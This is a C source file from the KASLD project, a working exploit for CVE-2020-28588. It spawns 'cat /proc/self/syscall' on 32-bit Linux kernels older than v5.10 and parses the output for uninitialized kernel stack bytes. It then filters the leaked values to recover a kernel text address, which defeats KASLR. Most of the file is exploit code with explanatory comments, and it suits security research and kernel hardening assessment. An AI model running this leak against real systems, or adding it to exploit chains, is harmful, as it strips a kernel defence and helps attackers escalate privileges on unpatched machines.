// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve process syscall argument registers from /proc/<PID>/syscall
// which may leak uninitialized kernel stack memory from collect_syscall()
// on 32-bit systems (ARM/x86_32/...) (CVE-2020-28588).
// Discovered by Lilith >_> and Claudio Bozzato of Cisco Talos.
//
// Introduced in kernel v5.1-rc4 on 2019-04-04:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
//
// Patched in kernel v5.10-rc7~25 on 2020-12-03.
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
//
// Leak primitive:
//   Data leaked:      kernel stack data (uninitialized upper bytes of syscall
//   args) Kernel subsystem: fs/proc — /proc/<PID>/syscall (collect_syscall)
//   Data structure:   struct syscall_info → data.args[] (upper 32 bits on
//   32-bit) Address type:     virtual (kernel stack) Method:           parsed
//   CVE:              CVE-2020-28588
//   Patched:          v5.10 (commit 4f134b89a24b)
//   Status:           fixed in v5.10
//   Access check:     none pre-v5.10 (world-readable /proc/<PID>/syscall)
//   Source: https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c
//
// Mitigations:
//   Patched in v5.10. No runtime sysctl could restrict access — the bug was
//   in collect_syscall() failing to zero upper bytes of 64-bit arg fields on
//   32-bit systems. Only affects 32-bit kernels (ARM, x86_32, etc.).
//
// Requires:
// - CONFIG_HAVE_ARCH_TRACEHOOK=y
//
// References:
// https://talosintelligence.com/vulnerability_reports/TALOS-2020-1211
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
// https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
//
// 32-bit-kernel only — gated at compile time. The bug is in 32-bit kernels'
// collect_syscall() (the high 32 bits of 64-bit syscall_info args are not
// zeroed). 64-bit kernels follow a different code path and are not
// vulnerable. On 64-bit kernels the argument-register values exposed by
// /proc/<PID>/syscall are ordinary syscall numbers and pointers, none of
// which carry the kernel-stack residue the exploit reads on 32-bit, and
// misinterpreting a small integer (e.g. a syscall number) as a kernel
// address would produce a nonsense observation.
// ---
// <bcoles@gmail.com>

#if __SIZEOF_LONG__ != 4
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/kernel_floor.h"
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads /proc/<PID>/syscall on a 32-bit kernel. The file reports six "
    "64-bit argument registers, but on 32-bit only the lower 32 bits are "
    "used. Before the v5.10 fix (CVE-2020-28588), the upper 32 bits were "
    "not zeroed, leaking stale kernel stack data that often contains "
    "kernel text or stack pointers.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "cve:CVE-2020-28588\n"
           "patch:v5.10\n"
           "config:CONFIG_HAVE_ARCH_TRACEHOOK\n");

static unsigned long get_kernel_addr_proc_pid_syscall(void) {
  FILE *f;
  int iterations = 10;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;
  const char *cmd = "/bin/cat /proc/self/syscall";
  char buff[1024];
  char *ptr;
  char *endptr;

  kasld_info("checking /proc/self/syscall argument registers ...");

  int i;
  for (i = 0; i < iterations; i++) {
    /* cat is the leaker, not this process. The CVE leaks stale upper
     * bytes of 64-bit arg fields from the reading process's kernel
     * stack at collect_syscall() time; cat's stack at read(2) is
     * shallower and empirically yields lower (closer to _stext)
     * addresses than an in-process fopen, whose stack carries libc
     * startup + the KASLD emitter call chain. */
    f = popen(cmd, "r");
    if (f == NULL) {
      perror("[-] popen");
      return 0;
    }

    if (fgets(buff, sizeof(buff), f) == NULL) {
      perror("[-] fgets");
      pclose(f);
      return 0;
    }

    pclose(f);

    /* Lazy implementation. In practice we only want data after the first 24
     * bytes (from the fifth value onwards).
     *
     * $ cat /proc/self/syscall
     * 0 0x76f7300000000003 0x4000 0x0 0x8050389c8098fde4 0xee297df0ee297e2c ...
     *                                   ^       ^
     */
    ptr = strtok(buff, " ");
    while ((ptr = strtok(NULL, " ")) != NULL) {
      int reg_addr_len = strlen(ptr);

      // Registers are printed without leading zeros (0x00001234 -> "0x1234"),
      // possibly concatenated (0x0000abcd and 0x12345678 -> "0xabcd12345678").
      //
      // Accept lengths 10 (single 8-hex-digit register with "0x" prefix) or
      // 11–18 (two concatenated registers). Kernel pointers mapped below
      // 0x10000000 (e.g. phys 0x00008000) are missed by this length check.
      if (reg_addr_len < 10 || reg_addr_len > 18)
        continue;

      unsigned long long reg_addr = strtoull(&ptr[0], &endptr, 16);

      if (!reg_addr)
        continue;

      if (reg_addr_len == 10) {
        // register argument is a single pointer.
        leaked_addr = reg_addr;
      } else if (reg_addr_len > 10 && reg_addr_len <= 18) {
        // register argument is two concatenated pointers.
        // split it and choose the lowest of the two.
        unsigned long a = reg_addr >> 32;
        unsigned long b = reg_addr & 0xffffffff;

        /* Sort the two halves by the user/kernel boundary, not by
         * KERNEL_VIRT_TEXT_MIN: on 32-bit with a 3G/1G split that floor
         * (0x40000000) overlaps user space and would misread register values
         * (SP, LR, mmap addresses) as kernel pointers. Kernel stack addresses
         * leaked by CVE-2020-28588 are always at or above the boundary.
         *
         * MEASURED rather than the compile-time PAGE_OFFSET, which names this
         * build's split and not the target's. On a kernel whose split sits
         * lower, every genuine pointer in between falls under that constant and
         * is dropped — silently, and indistinguishably from finding nothing.
         * The measured value is also far tighter than the sound static
         * alternative: PAGE_OFFSET_MIN is the same 0x40000000 this comment
         * rejects. */
        unsigned long floor = kasld_kernel_pointer_floor();
        if (a < floor && b < floor)
          continue;

        if (a >= floor && b >= floor) {
          if (a < b) {
            leaked_addr = a;
          } else {
            leaked_addr = b;
          }
        } else if (a >= floor) {
          leaked_addr = a;
        } else if (b >= floor) {
          leaked_addr = b;
        }
      } else {
        continue;
      }

      if (!leaked_addr)
        continue;

      /* Region floor for a REGION_KERNEL_TEXT emission: a text address sits at
       * or above PAGE_OFFSET (the linear-map base), one module band above the
       * user/kernel boundary filter 1 sorted by. kasld_page_offset_floor() is
       * the MEASURED base snapped to the target's VMSPLIT, so a lower-split
       * kernel's real _text (0x80008000 on a 2G build) is admitted where the
       * compile-time PAGE_OFFSET would silently drop it. The max() with
       * KERNEL_VIRT_TEXT_MIN is defence-in-depth against a zero floor. */
      unsigned long po = kasld_page_offset_floor();
      unsigned long lo = po > (unsigned long)KERNEL_VIRT_TEXT_MIN
                             ? po
                             : (unsigned long)KERNEL_VIRT_TEXT_MIN;
      if (leaked_addr >= lo && leaked_addr <= KERNEL_VIRT_TEXT_MAX) {
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  return addr;
}

int main(void) {
  if (kasld_skip_live_probe("/proc/self/syscall"))
    return 0;
  /* Live probe: spawns `cat /proc/self/syscall` and parses the reading
   * process's leaked kernel-stack residue — dynamic per-process state. */
  unsigned long addr = get_kernel_addr_proc_pid_syscall();
  if (!addr) {
    kasld_err("no kernel address found in /proc/pid/syscall");
    return 0;
  }

  kasld_info("lowest leaked address: %lx", addr);
  kasld_info("possible kernel base: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_PARSED);

  return 0;
}
